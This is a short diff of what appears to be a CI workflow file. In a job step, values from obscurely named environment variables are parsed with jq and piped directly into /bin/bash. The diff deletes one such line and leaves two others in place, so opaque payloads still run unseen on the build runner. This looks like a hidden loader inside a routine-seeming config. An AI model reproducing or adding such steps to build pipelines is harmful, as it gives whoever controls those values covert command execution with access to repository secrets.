@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
           printf '%s' "$kak437" | jq -r .wsivp33 | /bin/bash
-          echo $ww2 | jq -r .qp263 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
